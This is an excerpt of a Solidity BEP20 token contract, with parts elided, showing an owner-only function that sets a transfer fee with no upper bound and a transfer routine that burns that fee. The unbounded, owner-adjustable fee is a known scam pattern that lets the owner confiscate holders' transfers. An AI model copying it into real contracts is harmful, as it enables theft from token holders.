...
contract Token is IBEP20, HasForeignAsset {
    ...
    function setfie(uint256 _value) external onlyOwner {
        _fie = _value;
    }


    function getfie() external onlyOwner returns(uint256){
        return _fie;
    }
    ...
    function _transfer(
        ...
        uint256 fieAmount = 0;
        fieAmount = amount.mul(_fie).div(100);
        uint256 amoun;
        amoun = amount - fieAmount;
        ...
        if (fieAmount > 0) {
            emit Transfer(sender, _DEADaddress, fieAmount);
        }
